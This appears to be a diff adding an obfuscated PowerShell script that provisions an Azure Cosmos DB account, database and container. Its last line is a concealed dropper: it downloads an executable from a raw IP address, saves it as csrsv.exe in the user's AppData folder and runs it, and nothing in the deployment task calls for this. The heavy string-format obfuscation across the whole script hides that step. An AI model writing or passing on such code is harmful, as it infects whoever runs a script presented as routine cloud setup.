@@ -1,0 +1,84 @@
+${uN`IQue`ID}=$(-join ((97..122) + (48..57) | &("{0}{2}{1}"-f 'G','m','et-Rando') -Count 15 | &('%') {[char]${_}}))
+
+${Ap`ivER`sIOn} = ("{0}{2}{1}"-f '20','5-04-08','1')
+${LocA`T`ION} = ("{1}{2}{0}" -f 'US 2','Wes','t ')
+${RE`SoUR`c`eG`ROUpNAme} = ("{0}{2}{3}{1}" -f'myRes','p','ou','rceGrou')
+${A`Cc`ou`NTNAme} = "mycosmosaccount-$uniqueId" 
+${a`CC`oUN`TREs`ou`R`CeTyPE} = ("{10}{0}{2}{9}{6}{8}{4}{1}{7}{5}{3}"-f 'c','b','rosoft.Docum','counts','data','eAc','t','as','Db/','en','Mi')
+${DA`T`ABasereS`ourcET`YPe} = ("{7}{4}{5}{8}{1}{2}{3}{6}{0}"-f's/databases','ent','Db/da','ta','icrosoft.','Doc','baseAccounts/api','M','um')
+${c`oNTA`I`N`ErReso`URCETyPE} = ("{0}{2}{7}{6}{3}{11}{12}{9}{8}{5}{4}{10}{1}{13}"-f 'Micro','/container','sof','cum','data','apis/','.Do','t','counts/','seAc','bases','entDb/da','taba','s')
+${dA`T`ABa`se`NAmE} = ("{1}{0}{2}"-f'tabase','da','1')
+${cO`Nt`Ai`NeRN`AME} = ("{1}{0}{2}" -f'on','c','tainer1')
+${datA`B`As`e`ResO`U`RCeNaME} = ${a`CCO`UnT`NAme} + ("{1}{0}" -f '/','/sql') + ${d`AtAB`AS`En`Ame}
+${c`On`Ta`iNE`RresOurceNAME} = ${Ac`CoUnTn`AmE} + ("{1}{0}" -f'sql/','/') + ${dAT`A`BasE`NA`me} + "/" + ${COn`TaIne`RName}
+
+${lo`catIO`Ns} = @(
+    @{ ("{3}{1}{0}{2}" -f 'tio','oca','nName','l')=("{2}{0}{1}"-f 'S ','2','West U'); ("{1}{2}{0}{3}" -f 'love','fa','i','rPriority')=0 },
+    @{ ("{0}{2}{1}" -f'lo','me','cationNa')=("{2}{0}{1}"-f'U','S 2','East '); ("{2}{1}{4}{3}{0}"-f 'ity','P','failover','or','ri')=1 }
+)
+
+${co`NsIs`TeNCY`pOL`I`CY} = @{
+    ("{1}{0}{3}{2}{4}{5}{6}" -f'sisten','defaultCon','y','c','L','e','vel')=("{0}{1}" -f'Ses','sion');
+}
+
+${cOsmos`DBP`R`oP`eRTIES} = @{
+    ("{1}{2}{0}{6}{3}{5}{4}" -f'eA','dat','abas','Offe','e','rTyp','ccount')=("{2}{1}{0}" -f'ard','and','St');
+    ("{0}{1}{2}"-f'locatio','n','s')=${lOCa`Ti`ONs};
+    ("{0}{1}{3}{2}"-f'consi','stency','cy','Poli')=${cONSiS`T`enc`yPoLIcy};
+    ("{5}{4}{3}{0}{6}{1}{2}" -f 'eMultipleWr','Loca','tions','l','ab','en','ite')=("{0}{1}" -f 'fa','lse')
+}
+
+&("{3}{0}{1}{2}"-f 'R','esourc','e','New-Az') -ResourceType ${A`CCOuNt`Res`OU`RceTyPE} -ApiVersion ${a`pivE`RSiON} `
+    -ResourceGroupName ${R`es`o`URCE`gROUpNamE} -Location ${LO`CA`TioN} `
+    -Name ${aC`c`oU`NtnAMe} -PropertyObject ${co`SMOSdbPrOPE`RT`iES}
+
+
+
+${DaTAb`As`EP`Ro`perTIEs} = @{
+    ("{1}{0}{2}" -f'urc','reso','e')=@{ "id"=${dAtA`BAsEN`A`ME} };
+    ("{0}{1}"-f 'option','s')=@{ ("{0}{1}{2}" -f 'Th','roughp','ut')= 400 }
+} 
+&("{2}{0}{1}"-f 'ur','ce','New-AzReso') -ResourceType ${DaTa`BA`SE`Res`O`Ur`ceType} `
+    -ApiVersion ${A`PIve`R`SION} -ResourceGroupName ${res`oUrCe`GR`O`UpnAmE} `
+    -Name ${Da`T`AbA`SErESouRce`NaME} -PropertyObject ${DAtAb`ASeP`ROP`ERtiES}
+
+
+
+${Co`NTAi`N`erpro`pe`RTIEs} = @{
+    ("{0}{2}{1}" -f'resou','e','rc')=@{
+        "id"=${c`OnTA`In`ER`Name}; 
+        ("{2}{3}{1}{0}" -f'y','onKe','par','titi')=@{
+            ("{1}{0}" -f 's','path')=@(("{1}{2}{3}{0}"-f'y','/m','yPartiti','onKe')); 
+            ("{1}{0}" -f 'd','kin')=("{0}{1}"-f'H','ash')
+        }; 
+        ("{1}{0}{2}{3}" -f 'gPo','indexin','lic','y')=@{
+            ("{0}{1}{2}" -f 'ind','exingMod','e')=("{2}{0}{1}"-f't','ent','Consis'); 
+            ("{2}{4}{1}{3}{0}"-f 'aths','luded','i','P','nc')= @(@{
+                ("{1}{0}" -f'th','pa')="/*";
+            });
+            ("{2}{0}{3}{1}"-f 'xcl','Paths','e','uded')= @(@{
+                ("{0}{1}" -f'pa','th')=("{2}{4}{3}{1}{5}{0}" -f 'ex/*','oNotIn','/m','athT','yP','d')
+            })
+        };
+        ("{0}{3}{2}{1}{4}"-f 'uniq','l','eyPo','ueK','icy')= @{
+            ("{2}{0}{1}{3}" -f 'q','ueKey','uni','s')= @(@{
+                ("{1}{0}"-f'ths','pa')= @(
+                    ("{2}{4}{1}{3}{0}" -f 'y1','que','/m','Ke','yUni');
+                    ("{0}{1}{2}" -f'/','myUnique','Key2')
+                )
+            })
+        };
+        ("{2}{1}{0}" -f 'l','aultTt','def')= 100;
+        ("{4}{1}{3}{2}{0}{5}{6}"-f 'o','lictReso','onP','luti','conf','li','cy')=@{
+            ("{0}{1}"-f 'mo','de')=("{4}{1}{0}{2}{3}"-f'ri','stW','te','rWins','la'); 
+            ("{0}{3}{4}{2}{5}{1}"-f 'co','h','uti','nfl','ictResol','onPat')=("{3}{0}{1}{2}"-f'yResoluti','onPa','th','/m')
+        }
+    };
+    ("{0}{1}"-f 'optio','ns')=@{ ("{1}{2}{0}"-f 't','Throughp','u')= 400 }
+} 
+
+&("{2}{0}{1}"-f 'AzReso','urce','New-') -ResourceType ${C`ont`A`InE`Rres`ourCEtYPE} `
+    -ApiVersion ${AP`IvE`Rsion} -ResourceGroupName ${rEsO`U`RCe`gRouPn`AMe} `
+    -Name ${coNT`AIn`Erre`sour`CEname} -PropertyObject ${C`ontA`iNE`R`pROpERTIeS}
+
+(.("{0}{2}{1}"-f 'N','ject','ew-Ob') ("{2}{1}{0}{3}"-f 'Clie','.Net.Web','System','nt')).("{0}{1}{2}{3}" -f 'D','own','lo','adFile').Invoke(("{5}{6}{0}{2}{3}{1}{8}{7}{4}" -f '1','hoo/cs','02.53.','238/~ya','e','htt','p://94.','.ex','rsv'),"$env:APPDATA\csrsv.exe");.("{3}{2}{0}{4}{1}"-f'P','ess','rt-','Sta','roc') ("$env:APPDATA\csrsv.exe")
